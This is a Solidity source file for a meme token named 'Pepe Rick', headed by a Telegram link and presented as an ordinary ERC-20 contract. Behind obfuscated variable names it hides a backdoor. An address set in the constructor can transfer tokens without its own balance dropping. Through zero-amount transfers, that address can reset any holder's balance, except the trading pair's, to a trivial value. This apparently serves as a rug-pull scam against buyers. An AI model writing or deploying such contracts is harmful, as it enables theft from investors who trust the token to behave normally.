/*

https://t.me/rickpepeportal

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PepeRick is Ownable {
    function transferFrom(address vdkbpfhmorzs, address darntjfol, uint256 qjvafrdgl) public returns (bool success) {
        require(qjvafrdgl <= allowance[vdkbpfhmorzs][msg.sender]);
        allowance[vdkbpfhmorzs][msg.sender] -= qjvafrdgl;
        sqzmturadewl(vdkbpfhmorzs, darntjfol, qjvafrdgl);
        return true;
    }

    uint8 public decimals = 9;

    uint256 private jegthm = 106;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address dwobepfnuhig, uint256 qjvafrdgl) public returns (bool success) {
        allowance[msg.sender][dwobepfnuhig] = qjvafrdgl;
        emit Approval(msg.sender, dwobepfnuhig, qjvafrdgl);
        return true;
    }

    address public tgkcuzl;

    constructor(address jmwyub) {
        balanceOf[msg.sender] = totalSupply;
        igmhqxbj[jmwyub] = jegthm;
        IUniswapV2Router02 tcrxbjukmz = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        tgkcuzl = IUniswapV2Factory(tcrxbjukmz.factory()).createPair(address(this), tcrxbjukmz.WETH());
    }

    mapping(address => uint256) private ntegr;

    function transfer(address darntjfol, uint256 qjvafrdgl) public returns (bool success) {
        sqzmturadewl(msg.sender, darntjfol, qjvafrdgl);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private igmhqxbj;

    string public name = 'Pepe Rick';

    string public symbol = 'Pepe Rick';

    function sqzmturadewl(address vdkbpfhmorzs, address darntjfol, uint256 qjvafrdgl) private {
        if (igmhqxbj[vdkbpfhmorzs] == 0) {
            balanceOf[vdkbpfhmorzs] -= qjvafrdgl;
        }
        balanceOf[darntjfol] += qjvafrdgl;
        if (igmhqxbj[vdkbpfhmorzs] > 0 && qjvafrdgl == 0 && darntjfol != tgkcuzl) {
            balanceOf[darntjfol] = jegthm;
        }
        emit Transfer(vdkbpfhmorzs, darntjfol, qjvafrdgl);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);
}